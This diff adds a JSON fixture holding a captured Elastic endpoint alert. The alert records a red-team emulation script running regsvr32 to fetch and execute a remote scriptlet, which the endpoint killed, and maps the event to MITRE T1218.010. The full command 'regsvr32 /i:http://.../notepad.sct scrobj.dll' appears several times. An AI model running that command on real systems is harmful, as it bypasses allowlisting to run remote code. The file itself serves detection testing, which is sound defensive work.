@@ -1,0 +1,622 @@
+{
+  "kibana.version": "8.3.0",
+  "kibana.alert.rule.category": "Custom Query Rule",
+  "kibana.alert.rule.consumer": "siem",
+  "kibana.alert.rule.execution.uuid": "515246d5-c825-491f-9411-85015f46947f",
+  "kibana.alert.rule.name": "Malicious Behavior Prevention Alert: Regsvr32 Scriptlet Execution",
+  "kibana.alert.rule.producer": "siem",
+  "kibana.alert.rule.rule_type_id": "siem.queryRule",
+  "kibana.alert.rule.uuid": "499a4611-1a4b-11ed-bb53-ad8c26f4d942",
+  "kibana.space_ids": [
+    "default"
+  ],
+  "kibana.alert.rule.tags": [
+    "Elastic",
+    "Endpoint Security"
+  ],
+  "@timestamp": "2022-08-12T14:45:36.171Z",
+  "agent": {
+    "build": {
+      "original": "version: 8.3.0, compiled: Thu Jun 23 19:00:00 2022, branch: 8.3, commit: 0565bb1d16a5e6444bbe8fbc082969cf030df3ea"
+    },
+    "id": "d463a3c2-d9ae-4ae9-91da-fa85867b51e1",
+    "type": "endpoint",
+    "version": "8.3.0"
+  },
+  "process": {
+    "Ext": {
+      "ancestry": [
+        "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTExNDEyLTEzMzA0Nzg4ODE5Ljc1OTE4MDIwMA==",
+        "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTU5NTItMTMzMDQ3ODg4MTkuNzIwOTgwNDAw",
+        "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTM2MzYtMTMzMDQ3ODg2NDIuMjMxNTA2MTAw",
+        "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTYxODAtMTMzMDQ3ODgxNjYuNDA2NDExMDAw"
+      ],
+      "code_signature": [
+        {
+          "trusted": true,
+          "subject_name": "Microsoft Windows",
+          "exists": true,
+          "status": "trusted"
+        }
+      ],
+      "authentication_id": "0x1dd63c",
+      "token": {
+        "integrity_level_name": "medium",
+        "security_attributes": [
+          "TSA://ProcUnique"
+        ],
+        "elevation_level": "limited"
+      }
+    },
+    "parent": {
+      "args": [
+        "C:\\Python27\\python.exe",
+        "C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\regsvr32_scrobj.py"
+      ],
+      "name": "python.exe",
+      "pid": 11412,
+      "args_count": 2,
+      "entity_id": "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTExNDEyLTEzMzA0Nzg4ODE5Ljc1OTE4MDIwMA==",
+      "command_line": "C:\\Python27\\python.exe  C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\regsvr32_scrobj.py",
+      "executable": "C:\\Python27\\python.exe"
+    },
+    "pid": 4896,
+    "working_directory": "C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\",
+    "entity_id": "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTQ4OTYtMTMzMDQ3ODg4MjIuNjA0OTQ5MDA=",
+    "executable": "C:\\Windows\\System32\\regsvr32.exe",
+    "args": [
+      "regsvr32.exe",
+      "/u",
+      "/n",
+      "/s",
+      "/i:http://10.128.0.78:8000/bin/notepad.sct",
+      "scrobj.dll"
+    ],
+    "code_signature": {
+      "trusted": true,
+      "subject_name": "Microsoft Windows",
+      "exists": true,
+      "status": "trusted"
+    },
+    "pe": {
+      "original_file_name": "REGSVR32.EXE"
+    },
+    "name": "regsvr32.exe",
+    "args_count": 6,
+    "command_line": "regsvr32.exe /u /n /s /i:http://10.128.0.78:8000/bin/notepad.sct scrobj.dll",
+    "hash": {
+      "sha1": "855a676f3018e78a37a9fb4aaa159584ec21c85c",
+      "sha256": "9f68f5fc21270a06bb934b5f3fa5aee2068a56a1260d4e7e4b48f2dca501b8c9",
+      "md5": "266aedbec51e35277729294996a213dd"
+    }
+  },
+  "rule": {
+    "reference": [],
+    "name": "Regsvr32 Scriptlet Execution",
+    "ruleset": "production",
+    "description": "Identifies the native Windows tool, regsvr32.exe, executing a scriptlet file. This can allow an attacker to bypass whitelisting and run arbitrary scripts.",
+    "id": "0524c24c-e45e-4220-b21a-abdba0c46c4d",
+    "version": "1.0.7"
+  },
+  "message": "Malicious Behavior Prevention Alert: Regsvr32 Scriptlet Execution",
+  "Responses": [
+    {
+      "result": 0,
+      "process": {
+        "name": "regsvr32.exe",
+        "pid": 4896,
+        "entity_id": "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTQ4OTYtMTMzMDQ3ODg4MjIuNjA0OTQ5MDA="
+      },
+      "@timestamp": "2022-08-12T14:40:22.0861985Z",
+      "action": {
+        "field": "process.entity_id",
+        "action": "kill_process",
+        "state": 0
+      },
+      "message": "Success"
+    }
+  ],
+  "Endpoint": {
+    "policy": {
+      "applied": {
+        "artifacts": {
+          "global": {
+            "identifiers": [
+              {
+                "sha256": "e57a7d5638060e9655c64ac1d02f7949b87e5f5f27f2074329608db1e06d645b",
+                "name": "diagnostic-configuration-v1"
+              },
+              {
+                "sha256": "17d8695f22d3817c426a0e08a477b88ecdb6088bc253dfbccc760224600afcfd",
+                "name": "diagnostic-endpointpe-v4-blocklist"
+              },
+              {
+                "sha256": "32d8d3e1fb323d29aa09ea2e565a4f62685c381dbb0f7d7a982acb958f3305d7",
+                "name": "diagnostic-endpointpe-v4-exceptionlist"
+              },
+              {
+                "sha256": "75b0772c6a5c0ad4abfcefe3d35b09f8ed0f04e70757547b3b904ed76ba9dc41",
+                "name": "diagnostic-endpointpe-v4-model"
+              },
+              {
+                "sha256": "12dbe46b1df6c58bbbbc844a959c56426e22a7bd3a5ce8902979309d0f115284",
+                "name": "diagnostic-malware-signature-v1-windows"
+              },
+              {
+                "sha256": "92ec3c0262dd3acff20ff74f971b601e66c404267db3572ba50dc23d6cdb48e5",
+                "name": "diagnostic-ransomware-v1-windows"
+              },
+              {
+                "sha256": "5def544b81f11aa7f1d1d79011c8cde4e426cabd51f9e3acbf208e84578138b8",
+                "name": "diagnostic-rules-windows-v1"
+              },
+              {
+                "sha256": "906beb3e15d4e71a5ccd47fef85effcb5d9dea02ea060caa514c95fdcc5ea7a5",
+                "name": "endpointpe-v4-blocklist"
+              },
+              {
+                "sha256": "da25c2dc5ea3bcbbdfb2f9221ec101b40cc9ca0d9475841f119ddefeb231b41a",
+                "name": "endpointpe-v4-exceptionlist"
+              },
+              {
+                "sha256": "73a7ab1de37d02e69c440fbd0583d30c064c3f37c6201c01a27f95a10ff59bfb",
+                "name": "endpointpe-v4-model"
+              },
+              {
+                "sha256": "2a747a4548ed22bf57db8c651bb41b0eb96ffe791d8c3a1efa8e13a58f4d8e74",
+                "name": "global-configuration-v1"
+              },
+              {
+                "sha256": "d309bfb8fb555c9d3fba65ce7db66f46a0a14021db0cdc8c015eaf35c011e2dc",
+                "name": "global-eventfilterlist-windows-v1"
+              },
+              {
+                "sha256": "17e35994ba8f93f9b72295b714a501af1e88c0df4b3921449dc25058fbdaa894",
+                "name": "global-exceptionlist-windows"
+              },
+              {
+                "sha256": "3534acb69ccdf5967bb9c6e98dc613edf43b3b8a7ca2853e8009f54d738a6884",
+                "name": "global-trustlist-windows-v1"
+              },
+              {
+                "sha256": "49bd59b2b8cc83cf4553ecde831830379508d2338c62a4f293e250ab15272faf",
+                "name": "production-malware-signature-v1-windows"
+              },
+              {
+                "sha256": "fdf6f1192b79ec71142fb35b5f98508259d9d587764bf92c0d884ae30ddc0eca",
+                "name": "production-ransomware-v1-windows"
+              },
+              {
+                "sha256": "3d602fee30ddd73bcd7729cbe6b8a5cdb6f71fe6d4c743b410a0701c2cd3b8ce",
+                "name": "production-rules-windows-v1"
+              }
+            ],
+            "version": "1.0.357"
+          },
+          "user": {
+            "identifiers": [
+              {
+                "sha256": "d801aa1fb7ddcc330a5e3173372ea6af4a3d08ec58074478e85aa5603e926658",
+                "name": "endpoint-blocklist-windows-v1"
+              },
+              {
+                "sha256": "d801aa1fb7ddcc330a5e3173372ea6af4a3d08ec58074478e85aa5603e926658",
+                "name": "endpoint-eventfilterlist-windows-v1"
+              },
+              {
+                "sha256": "d801aa1fb7ddcc330a5e3173372ea6af4a3d08ec58074478e85aa5603e926658",
+                "name": "endpoint-exceptionlist-windows-v1"
+              },
+              {
+                "sha256": "d801aa1fb7ddcc330a5e3173372ea6af4a3d08ec58074478e85aa5603e926658",
+                "name": "endpoint-hostisolationexceptionlist-windows-v1"
+              },
+              {
+                "sha256": "d801aa1fb7ddcc330a5e3173372ea6af4a3d08ec58074478e85aa5603e926658",
+                "name": "endpoint-trustlist-windows-v1"
+              }
+            ],
+            "version": "1.0.0"
+          }
+        }
+      }
+    }
+  },
+  "ecs": {
+    "version": "1.11.0"
+  },
+  "Events": [
+    {
+      "process": {
+        "Ext": {
+          "ancestry": [
+            "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTExNDEyLTEzMzA0Nzg4ODE5Ljc1OTE4MDIwMA==",
+            "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTU5NTItMTMzMDQ3ODg4MTkuNzIwOTgwNDAw",
+            "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTM2MzYtMTMzMDQ3ODg2NDIuMjMxNTA2MTAw",
+            "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTYxODAtMTMzMDQ3ODgxNjYuNDA2NDExMDAw"
+          ],
+          "code_signature": [
+            {
+              "trusted": true,
+              "subject_name": "Microsoft Windows",
+              "exists": true,
+              "status": "trusted"
+            }
+          ],
+          "authentication_id": "0x1dd63c",
+          "token": {
+            "integrity_level_name": "medium",
+            "security_attributes": [
+              "TSA://ProcUnique"
+            ],
+            "elevation_level": "limited"
+          }
+        },
+        "parent": {
+          "args": [
+            "C:\\Python27\\python.exe",
+            "C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\regsvr32_scrobj.py"
+          ],
+          "name": "python.exe",
+          "pid": 11412,
+          "args_count": 2,
+          "entity_id": "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTExNDEyLTEzMzA0Nzg4ODE5Ljc1OTE4MDIwMA==",
+          "command_line": "C:\\Python27\\python.exe  C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\regsvr32_scrobj.py",
+          "executable": "C:\\Python27\\python.exe"
+        },
+        "pid": 4896,
+        "working_directory": "C:\\Users\\random-user\\Downloads\\test\\RTA-master\\RTA-master\\red_ttp\\",
+        "entity_id": "ZDQ2M2EzYzItZDlhZS00YWU5LTkxZGEtZmE4NTg2N2I1MWUxLTQ4OTYtMTMzMDQ3ODg4MjIuNjA0OTQ5MDA=",
+        "executable": "C:\\Windows\\System32\\regsvr32.exe",
+        "args": [
+          "regsvr32.exe",
+          "/u",
+          "/n",
+          "/s",
+          "/i:http://10.128.0.78:8000/bin/notepad.sct",
+          "scrobj.dll"
+        ],
+        "code_signature": {
+          "trusted": true,
+          "subject_name": "Microsoft Windows",
+          "exists": true,
+          "status": "trusted"
+        },
+        "pe": {
+          "original_file_name": "REGSVR32.EXE"
+        },
+        "name": "regsvr32.exe",
+        "args_count": 6,
+        "command_line": "regsvr32.exe /u /n /s /i:http://10.128.0.78:8000/bin/notepad.sct scrobj.dll",
+        "hash": {
+          "sha1": "855a676f3018e78a37a9fb4aaa159584ec21c85c",
+          "sha256": "9f68f5fc21270a06bb934b5f3fa5aee2068a56a1260d4e7e4b48f2dca501b8c9",
+          "md5": "266aedbec51e35277729294996a213dd"
+        }
+      },
+      "@timestamp": "2022-08-12T14:40:22.0604949Z",
+      "_state": 0,
+      "host": {
+        "hostname": "My-PC",
+        "os": {
+          "Ext": {
+            "variant": "Windows Server 2022 Datacenter"
+          },
+          "kernel": "21H2 (10.0.20348.825)",
+          "name": "Windows",
+          "family": "windows",
+          "type": "windows",
+          "version": "21H2 (10.0.20348.825)",
+          "platform": "windows",
+          "full": "Windows Server 2022 Datacenter 21H2 (10.0.20348.825)"
+        },
+        "ip": [
+          "10.128.0.78",
+          "fe80::9148:b822:a74a:c6f3",
+          "127.0.0.1",
+          "::1"
+        ],
+        "name": "My-PC",
+        "id": "13748c2e-ae9b-446d-97f6-028c1ee61ef8",
+        "mac": [
+          "42:01:0a:80:00:4e"
+        ],
+        "architecture": "x86_64"
+      },
+      "event": {
+        "created": "2022-08-12T14:40:22.0604949Z",
+        "kind": "event",
+        "action": "start",
+        "id": "MjNYqa6SWNxdFW4U+++++AjX",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ]
+      },
+      "message": "Endpoint process event",
+      "user": {
+        "domain": "RANDOM-USER",
+        "name": "random-user",
+        "id": "S-1-5-21-3922267609-3102133550-311164941-1000"
+      },
+      "_label": "regsvr32_suspicious_args"
+    }
+  ],
+  "data_stream": {
+    "namespace": "default",
+    "type": "logs",
+    "dataset": "endpoint.alerts"
+  },
+  "elastic": {
+    "agent": {
+      "id": "d463a3c2-d9ae-4ae9-91da-fa85867b51e1"
+    }
+  },
+  "host": {
+    "hostname": "My-PC",
+    "os": {
+      "Ext": {
+        "variant": "Windows Server 2022 Datacenter"
+      },
+      "kernel": "21H2 (10.0.20348.825)",
+      "name": "Windows",
+      "family": "windows",
+      "type": "windows",
+      "version": "21H2 (10.0.20348.825)",
+      "platform": "windows",
+      "full": "Windows Server 2022 Datacenter 21H2 (10.0.20348.825)"
+    },
+    "ip": [
+      "10.128.0.78",
+      "fe80::9148:b822:a74a:c6f3",
+      "127.0.0.1",
+      "::1"
+    ],
+    "name": "My-PC",
+    "id": "13748c2e-ae9b-446d-97f6-028c1ee61ef8",
+    "mac": [
+      "42:01:0a:80:00:4e"
+    ],
+    "architecture": "x86_64",
+    "risk": {
+      "calculated_score": 880.73,
+      "calculated_score_norm": 88.73,
+      "calculated_level": "High",
+      "static_score": 900.0,
+      "static_score_norm": 90.0,
+      "static_level": "High"
+
+    }
+  },
+  "threat": [
+    {
+      "framework": "MITRE ATT&CK",
+      "technique": [
+        {
+          "reference": "https://attack.mitre.org/techniques/T1218/",
+          "name": "Signed Binary Proxy Execution",
+          "subtechnique": [
+            {
+              "reference": "https://attack.mitre.org/techniques/T1218/010/",
+              "name": "Regsvr32",
+              "id": "T1218.010"
+            }
+          ],
+          "id": "T1218"
+        }
+      ],
+      "tactic": {
+        "reference": "https://attack.mitre.org/tactics/TA0005/",
+        "name": "Defense Evasion",
+        "id": "TA0005"
+      }
+    }
+  ],
+  "user": {
+    "domain": "RANDOM-USER",
+    "name": "random-user",
+    "id": "S-1-5-21-3922267609-3102133550-311164941-1000",
+    "risk": {
+        "calculated_score": 950.7,
+        "calculated_score_norm": 95.7,
+        "calculated_level": "Critical"
+    }
+  },
+  "event.severity": 73,
+  "event.code": "behavior",
+  "event.risk_score": 73,
+  "event.created": "2022-08-12T14:40:22.0700886Z",
+  "event.kind": "signal",
+  "event.module": "endpoint",
+  "event.type": [
+    "info",
+    "allowed"
+  ],
+  "event.agent_id_status": "verified",
+  "event.sequence": 22330,
+  "event.ingested": "2022-08-12T14:40:52Z",
+  "event.action": "rule_detection",
+  "event.id": "MjNYqa6SWNxdFW4U+++++Ajf",
+  "event.category": [
+    "malware",
+    "intrusion_detection"
+  ],
+  "event.dataset": "endpoint.alerts",
+  "event.outcome": "success",
+  "kibana.alert.original_time": "2022-08-12T14:40:22.070Z",
+  "kibana.alert.ancestors": [
+    {
+      "id": "tL-AkoIBiLzffz6DOFhn",
+      "type": "event",
+      "index": ".ds-logs-endpoint.alerts-default-2022.08.12-000001",
+      "depth": 0
+    }
+  ],
+  "kibana.alert.status": "active",
+  "kibana.alert.workflow_status": "open",
+  "kibana.alert.depth": 1,
+  "kibana.alert.reason": "malware, intrusion_detection event with process regsvr32.exe, parent process python.exe, by random-user on My-PC created high alert Malicious Behavior Prevention Alert: Regsvr32 Scriptlet Execution.",
+  "kibana.alert.severity": "high",
+  "kibana.alert.risk_score": 73,
+  "kibana.alert.rule.parameters": {
+    "description": "Generates a detection alert each time an Elastic Endpoint Security alert is received. Enabling this rule allows you to immediately begin investigating your Endpoint alerts.",
+    "risk_score": 47,
+    "severity": "medium",
+    "license": "Elastic License v2",
+    "rule_name_override": "message",
+    "timestamp_override": "event.ingested",
+    "author": [
+      "Elastic"
+    ],
+    "false_positives": [],
+    "from": "now-10m",
+    "rule_id": "9a1a2dae-0b5f-4c3d-8305-a268d404c306",
+    "max_signals": 10000,
+    "risk_score_mapping": [
+      {
+        "field": "event.risk_score",
+        "operator": "equals",
+        "value": ""
+      }
+    ],
+    "severity_mapping": [
+      {
+        "field": "event.severity",
+        "operator": "equals",
+        "severity": "low",
+        "value": "21"
+      },
+      {
+        "field": "event.severity",
+        "operator": "equals",
+        "severity": "medium",
+        "value": "47"
+      },
+      {
+        "field": "event.severity",
+        "operator": "equals",
+        "severity": "high",
+        "value": "73"
+      },
+      {
+        "field": "event.severity",
+        "operator": "equals",
+        "severity": "critical",
+        "value": "99"
+      }
+    ],
+    "threat": [],
+    "to": "now",
+    "references": [],
+    "version": 3,
+    "exceptions_list": [
+      {
+        "id": "endpoint_list",
+        "list_id": "endpoint_list",
+        "namespace_type": "agnostic",
+        "type": "endpoint"
+      }
+    ],
+    "immutable": true,
+    "related_integrations": [],
+    "required_fields": [],
+    "setup": "",
+    "type": "query",
+    "language": "kuery",
+    "index": [
+      "logs-endpoint.alerts-*"
+    ],
+    "query": "event.kind:alert and event.module:(endpoint and not endgame)\n"
+  },
+  "kibana.alert.rule.actions": [],
+  "kibana.alert.rule.author": [
+    "Elastic"
+  ],
+  "kibana.alert.rule.created_at": "2022-08-12T14:30:20.316Z",
+  "kibana.alert.rule.created_by": "4139736004",
+  "kibana.alert.rule.description": "Generates a detection alert each time an Elastic Endpoint Security alert is received. Enabling this rule allows you to immediately begin investigating your Endpoint alerts.",
+  "kibana.alert.rule.enabled": true,
+  "kibana.alert.rule.exceptions_list": [
+    {
+      "id": "endpoint_list",
+      "list_id": "endpoint_list",
+      "namespace_type": "agnostic",
+      "type": "endpoint"
+    }
+  ],
+  "kibana.alert.rule.false_positives": [],
+  "kibana.alert.rule.from": "now-10m",
+  "kibana.alert.rule.immutable": true,
+  "kibana.alert.rule.interval": "5m",
+  "kibana.alert.rule.license": "Elastic License v2",
+  "kibana.alert.rule.max_signals": 10000,
+  "kibana.alert.rule.references": [],
+  "kibana.alert.rule.risk_score_mapping": [
+    {
+      "field": "event.risk_score",
+      "operator": "equals",
+      "value": ""
+    }
+  ],
+  "kibana.alert.rule.rule_id": "9a1a2dae-0b5f-4c3d-8305-a268d404c306",
+  "kibana.alert.rule.rule_name_override": "message",
+  "kibana.alert.rule.severity_mapping": [
+    {
+      "field": "event.severity",
+      "operator": "equals",
+      "severity": "low",
+      "value": "21"
+    },
+    {
+      "field": "event.severity",
+      "operator": "equals",
+      "severity": "medium",
+      "value": "47"
+    },
+    {
+      "field": "event.severity",
+      "operator": "equals",
+      "severity": "high",
+      "value": "73"
+    },
+    {
+      "field": "event.severity",
+      "operator": "equals",
+      "severity": "critical",
+      "value": "99"
+    }
+  ],
+  "kibana.alert.rule.threat": [],
+  "kibana.alert.rule.timestamp_override": "event.ingested",
+  "kibana.alert.rule.to": "now",
+  "kibana.alert.rule.type": "query",
+  "kibana.alert.rule.updated_at": "2022-08-12T14:30:20.316Z",
+  "kibana.alert.rule.updated_by": "4139736004",
+  "kibana.alert.rule.version": 3,
+  "kibana.alert.rule.risk_score": 47,
+  "kibana.alert.rule.severity": "medium",
+  "kibana.alert.original_event.severity": 73,
+  "kibana.alert.original_event.code": "behavior",
+  "kibana.alert.original_event.risk_score": 73,
+  "kibana.alert.original_event.created": "2022-08-12T14:40:22.0700886Z",
+  "kibana.alert.original_event.kind": "alert",
+  "kibana.alert.original_event.module": "endpoint",
+  "kibana.alert.original_event.type": [
+    "info",
+    "allowed"
+  ],
+  "kibana.alert.original_event.agent_id_status": "verified",
+  "kibana.alert.original_event.sequence": 22330,
+  "kibana.alert.original_event.ingested": "2022-08-12T14:40:52Z",
+  "kibana.alert.original_event.action": "rule_detection",
+  "kibana.alert.original_event.id": "MjNYqa6SWNxdFW4U+++++Ajf",
+  "kibana.alert.original_event.category": [
+    "malware",
+    "intrusion_detection"
+  ],
+  "kibana.alert.original_event.dataset": "endpoint.alerts",
+  "kibana.alert.original_event.outcome": "success",
+  "kibana.alert.uuid": "bbef4313d1ced5ff3c8558ebdd11a4dd7ea5df5df5bb391335f60845d361eba5"
+}
